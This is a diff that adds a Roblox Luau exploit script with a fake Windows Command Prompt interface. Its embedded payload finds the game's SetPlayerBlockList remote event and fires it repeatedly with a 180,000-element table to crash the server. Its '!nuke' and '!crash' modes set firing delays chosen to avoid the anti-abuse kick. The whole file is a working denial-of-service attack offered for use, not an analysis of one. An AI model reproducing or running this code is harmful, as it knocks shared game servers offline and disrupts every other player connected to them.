@@ -1,0 +1,507 @@
+--!nonstrict
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- ═══════════ EXACT WORKING CORE (NO INSTANT KICK) ═══════════
+local SRC = [==[
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
+
+local Children       = 180000
+local Format         = "compact" -- Optimized format so your PC doesn't freeze
+
+local StartInterval  = 2.5
+local MinInterval    = 0.30
+local MaxInterval    = 15.0
+local BackoffFactor  = 1.45
+local SpeedupFactor  = 0.88
+local SpeedupAfter   = 4
+local PanicMB        = 250
+local StartDelay     = 0.8
+
+local RemoteCandidates = {
+    { "RobloxReplicatedStorage", "SetPlayerBlockList" },
+    { "ReplicatedStorage",       "SetPlayerBlockList" },
+}
+
+local state = {
+    running = false, thread = nil, remote = nil, cache = nil,
+    ms = 0, passes = 0, errors = 0, mem = 0, base = nil, queued = 0,
+    payloadMb = 1, reason = "", interval = StartInterval, children = 0,
+    samples = {}, isNuke = false
+}
+
+local function getMem()
+    local ok, mb = pcall(function() return Stats:GetTotalMemoryUsageMb() end)
+    if ok and type(mb) == "number" then return mb end
+    return nil
+end
+
+local function pushSample(m)
+    local s = state.samples
+    s[#s + 1] = m
+    while #s > 10 do table.remove(s, 1) end
+    local lo = math.huge
+    for _, v in ipairs(s) do if v < lo then lo = v end end
+    if lo < math.huge then state.base = lo end
+end
+
+local function resolve()
+    for _, path in ipairs(RemoteCandidates) do
+        local node, ok = game, true
+        for i = 1, #path do
+            local nxt = node:FindFirstChild(path[i])
+            if not nxt then ok = false; break end
+            node = nxt
+        end
+        if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
+            return node
+        end
+    end
+    return nil
+end
+
+local function build(yieldAllowed)
+    local n = Children
+    local root = table.create(n)
+    for i = 1, n do
+        root[i] = { i, i * 2 }
+        if yieldAllowed and (i % 100000 == 0) then task.wait() end
+    end
+    return root
+end
+
+local function fire()
+    if not state.remote then
+        state.remote = resolve()
+        if not state.remote then return end
+    end
+    local payload = state.cache
+    if not payload then
+        payload = build(false)
+        state.cache = payload
+    end
+    for _ = 1, 1.5 do
+        state.remote:FireServer(payload)
+    end
+end
+
+local function rebuild()
+    state.cache = build(true)
+    state.children = Children
+    state.samples = {}
+    state.interval = StartInterval
+end
+
+local function start(isNuke)
+    if state.running then return end
+    state.running = true
+    state.errors, state.reason = 0, ""
+    state.isNuke = isNuke
+
+    state.thread = task.spawn(function()
+        if not isNuke and StartDelay > 0 then task.wait(StartDelay) end
+
+        rebuild()
+        if not isNuke then task.wait(0.4) end
+
+        if not isNuke then
+            local m0 = getMem()
+            if m0 then pushSample(m0) end
+            task.wait(0.5)
+        end
+
+        -- CRASH = 0.13 (Safe) | NUKE = 0.10 (Fastest without instant kick)
+        local delay = isNuke and 0.10 or 0.13
+        local good = 0
+
+        while state.running do
+            if not state.remote then
+                state.remote = resolve()
+                if not state.remote then task.wait(0.25); continue end
+            end
+
+            if isNuke then
+                local ok = pcall(fire)
+                if ok then state.passes += 1 end
+                task.wait(0.10) 
+            else
+                local m = getMem()
+                local queued = 0
+                if m and state.base then
+                    queued = math.max(m - state.base, 0)
+                    state.queued = queued
+                end
+
+                local f0 = os.clock()
+                local ok = pcall(fire)
+                local cost = os.clock() - f0
+                state.ms = cost * 1000
+
+                if ok then
+                    state.passes += 1
+                    state.errors = 0
+                else
+                    state.errors += 1
+                end
+
+                if state.errors > 30 then
+                    state.running = false
+                    state.reason = "remote errors"
+                    break
+                end
+
+                task.wait(delay)
+                local m2 = getMem()
+                if m2 then pushSample(m2) end
+            end
+        end
+    end)
+end
+
+local function stop()
+    state.running = false
+    if state.thread then pcall(task.cancel, state.thread) end
+    state.thread, state.cache = nil, nil
+    state.ms, state.queued = 0, 0
+    state.isNuke = false
+end
+
+local function setChildren(n)
+    Children = math.max(1000, math.floor(n))
+    state.cache = nil
+    state.children = Children
+end
+
+return {
+    start = start, stop = stop, setChildren = setChildren,
+    stats = function()
+        return state.ms, state.passes, state.mem, Children, state.queued,
+               state.reason, state.interval, state.isNuke
+    end,
+}
+]==]
+
+local compile = loadstring or load
+local api
+do
+    local ok, res = pcall(function() return compile(SRC)() end)
+    if ok and type(res) == "table" and res.start then
+        api = res
+    end
+end
+
+-- ═══════════ WINDOWS CMD PROMPT UI ═══════════
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "WindowsTerminal"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
+
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 820, 0, 520) 
+main.Position = UDim2.new(0.5, 0, 0.5, 0)
+main.AnchorPoint = Vector2.new(0.5, 0.5)
+main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+main.BorderSizePixel = 0
+main.Active = true
+main.Parent = screenGui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 4)
+mainCorner.Parent = main
+
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = Color3.fromRGB(50, 50, 50)
+mainStroke.Thickness = 1
+mainStroke.Parent = main
+
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 32)
+titleBar.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = main
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 4)
+titleCorner.Parent = titleBar
+
+local titleText = Instance.new("TextLabel")
+titleText.Size = UDim2.new(1, -180, 1, 0)
+titleText.Position = UDim2.new(0, 12, 0, 0)
+titleText.BackgroundTransparency = 1
+titleText.Font = Enum.Font.Gotham
+titleText.Text = "Command Prompt - C:\\Windows\\System32\\cmd.exe"
+titleText.TextColor3 = Color3.fromRGB(220, 220, 220)
+titleText.TextSize = 12
+titleText.TextXAlignment = Enum.TextXAlignment.Left
+titleText.Parent = titleBar
+
+local function createWinBtn(text, posX, isClose)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0, 46, 1, 0)
+    btn.Position = UDim2.new(1, posX, 0, 0)
+    btn.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
+    btn.BorderSizePixel = 0
+    btn.Font = Enum.Font.Gotham
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(220, 220, 220)
+    btn.TextSize = 12
+    btn.Parent = titleBar
+    btn.MouseEnter:Connect(function()
+        btn.BackgroundColor3 = isClose and Color3.fromRGB(232, 17, 35) or Color3.fromRGB(50, 50, 50)
+        if isClose then btn.TextColor3 = Color3.new(1,1,1) end
+    end)
+    btn.MouseLeave:Connect(function()
+        btn.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
+        if isClose then btn.TextColor3 = Color3.fromRGB(220, 220, 220) end
+    end)
+    return btn
+end
+
+local minBtn = createWinBtn("—", -92, false)
+local maxBtn = createWinBtn("□", -46, false)
+local closeBtn = createWinBtn("✕", 0, true)
+
+local consoleFrame = Instance.new("ScrollingFrame")
+consoleFrame.Size = UDim2.new(1, -20, 1, -76)
+consoleFrame.Position = UDim2.new(0, 10, 0, 42)
+consoleFrame.BackgroundTransparency = 1
+consoleFrame.BorderSizePixel = 0
+consoleFrame.ScrollBarThickness = 12
+consoleFrame.ScrollBarImageColor3 = Color3.fromRGB(70, 70, 70)
+consoleFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+consoleFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+consoleFrame.Parent = main
+
+local listLayout = Instance.new("UIListLayout")
+listLayout.Padding = UDim.new(0, 4)
+listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+listLayout.Parent = consoleFrame
+
+local inputBar = Instance.new("Frame")
+inputBar.Size = UDim2.new(1, -20, 0, 30)
+inputBar.Position = UDim2.new(0, 10, 1, -38)
+inputBar.BackgroundTransparency = 1
+inputBar.Parent = main
+
+local promptLabel = Instance.new("TextLabel")
+promptLabel.Size = UDim2.new(0, 180, 1, 0)
+promptLabel.BackgroundTransparency = 1
+promptLabel.Font = Enum.Font.Code
+promptLabel.Text = "C:\\Users\\Admin>"
+promptLabel.TextColor3 = Color3.fromRGB(204, 204, 204)
+promptLabel.TextSize = 18
+promptLabel.TextXAlignment = Enum.TextXAlignment.Left
+promptLabel.Parent = inputBar
+
+local inputBox = Instance.new("TextBox")
+inputBox.Size = UDim2.new(1, -185, 1, 0)
+inputBox.Position = UDim2.new(0, 180, 0, 0)
+inputBox.BackgroundTransparency = 1
+inputBox.Font = Enum.Font.Code
+inputBox.Text = ""
+inputBox.TextColor3 = Color3.fromRGB(204, 204, 204)
+inputBox.TextSize = 18
+inputBox.TextXAlignment = Enum.TextXAlignment.Left
+inputBox.ClearTextOnFocus = false
+inputBox.Active = true
+inputBox.Parent = inputBar
+
+local cursor = Instance.new("Frame")
+cursor.Size = UDim2.new(0, 9, 0, 18)
+cursor.Position = UDim2.new(0, 180, 0, 2)
+cursor.BackgroundColor3 = Color3.fromRGB(204, 204, 204)
+cursor.BorderSizePixel = 0
+cursor.Visible = false
+cursor.Parent = inputBar
+
+inputBox:GetPropertyChangedSignal("Text"):Connect(function()
+    local textWidth = #inputBox.Text * 10.5 
+    cursor.Position = UDim2.new(0, 180 + textWidth, 0, 2)
+end)
+
+inputBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        inputBox:CaptureFocus()
+    end
+end)
+
+inputBox.Focused:Connect(function() cursor.Visible = true end)
+
+task.spawn(function()
+    while screenGui.Parent do
+        task.wait(0.5)
+        if inputBox:IsFocused() then
+            cursor.Visible = not cursor.Visible
+        else
+            cursor.Visible = false
+        end
+    end
+end)
+
+local function log(text, color)
+    local txt = Instance.new("TextLabel")
+    txt.Size = UDim2.new(1, 0, 0, 24)
+    txt.BackgroundTransparency = 1
+    txt.Font = Enum.Font.Code
+    txt.Text = text
+    txt.TextColor3 = color or Color3.fromRGB(204, 204, 204)
+    txt.TextSize = 18
+    txt.TextXAlignment = Enum.TextXAlignment.Left
+    txt.TextWrapped = true
+    txt.Parent = consoleFrame
+    task.defer(function()
+        consoleFrame.CanvasPosition = Vector2.new(0, listLayout.AbsoluteContentSize.Y)
+    end)
+end
+
+local function processCommand(input)
+    local cmd = string.lower(input)
+    local args = string.split(cmd, " ")
+    
+    log("C:\\Users\\Admin> " .. input, Color3.fromRGB(255, 255, 255))
+    
+    if cmd == "!help" then
+        log("Available Commands:", Color3.fromRGB(0, 200, 255))
+        log("  !nuke           - Fires at 0.10 delay (Edge of kick limit)")
+        log("  !crash          - Fires at 0.13 delay (Safe, steady lag)")
+        log("  !stop           - Stop payload")
+        log("  !size <number>  - Manually change payload size")
+        log("  !ping           - Check server ping")
+        log("  !cls            - Clear screen")
+        
+    elseif cmd == "!nuke" then
+        if api then 
+            api.start(true) 
+            log("[!!!] NUKE ACTIVE. Firing at 0.10 delay.", Color3.fromRGB(255, 50, 50))
+        end
+        
+    elseif cmd == "!crash" then
+        if api then 
+            api.start(false) 
+            log("[+] Crasher started. Firing at 0.13 delay.", Color3.fromRGB(0, 255, 0))
+        end
+        
+    elseif cmd == "!stop" then
+        if api then 
+            api.stop()
+            log("[-] Payload stopped.", Color3.fromRGB(255, 50, 50))
+        end
+        
+    elseif cmd == "!ping" then
+        local p = 0
+        pcall(function() p = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
+        log("[*] Current Server Ping: " .. math.floor(p) .. "ms", Color3.fromRGB(0, 200, 255))
+        
+    elseif cmd == "!cls" then
+        for _, v in ipairs(consoleFrame:GetChildren()) do
+            if v:IsA("TextLabel") then v:Destroy() end
+        end
+        
+    elseif cmd == "!exit" then
+        if api then api.stop() end
+        screenGui:Destroy()
+        
+    elseif args[1] == "!size" then
+        local num = tonumber(args[2])
+        if num and num > 1000 then
+            if api then api.setChildren(num) end
+            log("[+] Payload size set to " .. num, Color3.fromRGB(0, 255, 0))
+        else
+            log("[!] Invalid number.", Color3.fromRGB(255, 50, 50))
+        end
+    elseif cmd == "" then
+        -- Do nothing
+    else
+        log("'" .. cmd .. "' is not recognized as an internal or external command,", Color3.fromRGB(255, 50, 50))
+    end
+end
+
+inputBox.FocusLost:Connect(function(enterPressed)
+    cursor.Visible = false
+    if enterPressed then
+        local text = inputBox.Text
+        inputBox.Text = ""
+        if text ~= "" then processCommand(text) end
+    end
+end)
+
+-- ═══════════ DRAGGABLE & MINIMIZE ═══════════
+local dragging = false
+local dragStart, startPos
+
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        if input.Position.X >= minBtn.AbsolutePosition.X and input.Position.X <= (closeBtn.AbsolutePosition.X + closeBtn.AbsoluteSize.X) then return end
+        dragging = true
+        dragStart = input.Position
+        startPos = main.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+closeBtn.MouseButton1Click:Connect(function() if api then api.stop() end; screenGui:Destroy() end)
+
+local isMinimized = false
+minBtn.MouseButton1Click:Connect(function()
+    isMinimized = true
+    main.Size = UDim2.new(0, 820, 0, 32)
+    consoleFrame.Visible = false
+    inputBar.Visible = false
+end)
+
+maxBtn.MouseButton1Click:Connect(function()
+    isMinimized = false
+    main.Size = UDim2.new(0, 820, 0, 520)
+    consoleFrame.Visible = true
+    inputBar.Visible = true
+end)
+
+-- ═══════════ LIVE STATUS LOGGING ═══════════
+task.spawn(function()
+    local lastPasses = 0
+    while screenGui.Parent do
+        task.wait(3)
+        if api then
+            local ms, passes, mem, children, queued, reason, interval, isNuke = api.stats()
+            if passes > 0 then
+                local delta = passes - lastPasses
+                lastPasses = passes
+                
+                local p = 0
+                pcall(function() p = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
+                
+                local pColor = Color3.fromRGB(204, 204, 204)
+                if p > 800 then pColor = Color3.fromRGB(255, 50, 50) 
+                elseif p > 300 then pColor = Color3.fromRGB(255, 200, 50) end
+                
+                local mode = isNuke and "NUKE" or "CRASH"
+                log(string.format("[*] Status: %d fires/3s | Ping: %dms | Size: %d | %s", delta, p, children, mode), pColor)
+            end
+        end
+    end
+end)
+
+-- ═══════════ STARTUP BANNER ═══════════
+log("Microsoft Windows [Version 10.0.19045.3803]")
+log("(c) Microsoft Corporation. All rights reserved.")
+log("")
+processCommand("!help")
+log("")
+
+inputBox:CaptureFocus()
